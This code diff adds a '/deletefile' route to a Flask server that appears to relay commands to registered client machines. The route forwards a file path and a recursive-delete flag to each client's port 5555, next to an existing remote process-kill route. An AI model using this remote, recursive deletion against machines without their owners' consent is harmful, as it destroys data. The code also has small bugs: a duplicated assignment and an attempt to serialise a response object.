@@ -644,5 +644,33 @@ def kill_process():
     response = response = requests.post(f"http://{target_ip}:5555/killprocess",json=send_data)
     return jsonify({"response": response})
 
+
+
+@app.route("/deletefile", methods=["POST"])
+def delete_file():   
+    data = request.get_json() 
+
+    client_id = data.get("client_id")
+
+    target_ip = REGISTERED_CLIENTS.get(client_id).get("ip")
+
+    
+    location = data.get("location")
+
+    recurse = data.get("recurse")
+
+    send_data = {
+    "location": location,
+    "recurse": recurse
+    }
+
+    response = response = requests.post(f"http://{target_ip}:5555/deletefile",json=send_data)
+    return jsonify({"response": response})
+
+
+
+
+
+
 if __name__ == "__main__":
     app.run(host="127.0.0.1", port=5000, debug=True, threaded=True)
